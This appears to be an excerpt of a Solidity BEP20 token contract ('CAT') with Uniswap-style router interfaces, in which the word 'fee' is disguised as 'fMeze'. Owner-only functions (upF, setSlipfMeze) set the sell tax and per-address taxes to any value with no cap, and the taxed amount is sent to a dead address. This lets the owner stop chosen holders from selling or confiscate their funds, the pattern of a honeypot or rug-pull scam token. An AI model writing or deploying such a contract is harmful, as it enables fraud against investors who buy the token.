...
interface IUniswapV2Factory {
    ...
    function fMezeTo() external view returns (address);
    function fMezeToSetter() external view returns (address);
    ...
    function setfMezeTo(address) external;
    function setfMezeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfMezeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfMezeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfMezeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfMezeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfMezeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract CAT is BEP20, Ownable {
    ...
    uint256 private _defaultSellfMeze = 0;

    uint256 private _defaultBuyfMeze = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfMeze;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfMeze = _value;
    }

    function setSlipfMeze(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfMeze[_address] = _value;
    }

    function getSlipfMeze(address _address) external view onlyownar returns (uint256) {
        return _slipfMeze[_address];
    }


    function setMAccountfMeze(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfMeze(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefMezeAmount = 0;

        if (rF) {
            uint256 tradefMeze = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefMeze = _defaultSellfMeze;
                }
                if (from == uniswapV2Pair) {

                    tradefMeze = _defaultBuyfMeze;
                }
            }
            if (_slipfMeze[from] > 0) {
                tradefMeze = _slipfMeze[from];
            }

            tradefMezeAmount = _Amount.mul(tradefMeze).div(100);
        }


        if (tradefMezeAmount > 0) {
            _balances[from] = _balances[from].sub(tradefMezeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefMezeAmount);
            emit Transfer(from, _deadAddress, tradefMezeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefMezeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefMezeAmount);
        emit Transfer(from, _to, _Amount - tradefMezeAmount);
    }
